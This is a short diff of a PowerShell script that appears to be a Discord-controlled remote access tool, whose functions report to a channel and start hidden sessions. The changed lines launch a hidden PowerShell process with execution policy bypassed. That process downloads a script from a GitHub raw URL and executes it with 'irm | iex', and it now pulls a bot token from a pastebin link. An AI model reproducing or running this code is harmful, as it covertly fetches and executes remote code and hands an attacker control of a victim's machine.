@@ -984,8 +984,9 @@ Function ScreenParty {
     sendMsg -Message ":white_check_mark: ``Screen Party Started!`` :white_check_mark:"  
 }
 
+$url1 = irm 'https://pastebin.com/raw/EK8SdQQw'
 Function Powershell {
-    Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -W Hidden -C `$ch = '1468006904923164918'; `$tk = 'https://pastebin.com/raw/4P0BKHTY'; irm https://raw.githubusercontent.com/Lore-Bul/discord-ps-working/refs/heads/main/main.ps1 | iex")
+    Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -W Hidden -C `$ch = '1468006904923164918'; `$tk = '$url1'; irm https://raw.githubusercontent.com/Lore-Bul/discord-ps-working/refs/heads/main/main.ps1 | iex")
     sendMsg -Message ":white_check_mark: ``classic powershell on other channel!`` :white_check_mark:"  
 }
 
